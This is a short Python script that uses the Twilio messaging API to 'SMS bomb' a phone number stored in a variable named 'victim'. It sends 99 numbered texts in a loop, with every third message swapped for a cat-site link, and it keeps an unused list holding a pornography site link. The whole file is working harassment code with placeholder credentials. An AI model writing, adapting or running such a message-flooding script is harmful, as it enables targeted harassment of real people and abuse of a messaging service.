# we import the Twilio client from the dependency we just installed
from twilio.rest import TwilioRestClient

# the following line needs your Twilio Account SID and Auth Token
client = TwilioRestClient("XXXXXXXXXXXXXXXXXXXXX","XXXXXXXXXXXXXXXXXXXXXXXX")


victim ="+xxxxxxxxx"
you = "+xxxxxxxxx"

msg = "sms bomb #{0}"

porn_links = ["https://www.pornhub.com"]

cat_links = ["http://www.lolcats.com/"]

for x in range(1,100):
    client.messages.create(to=victim, from_= you ,body=msg.format(x))
    print("{0} msg(s) sent".format(x))
    if x % 3 == 0:
        print("sending special message!")
        msg = cat_links[0] + " meow"
    else:
        msg = "sms bomb #{0}"
print("messages sent!")
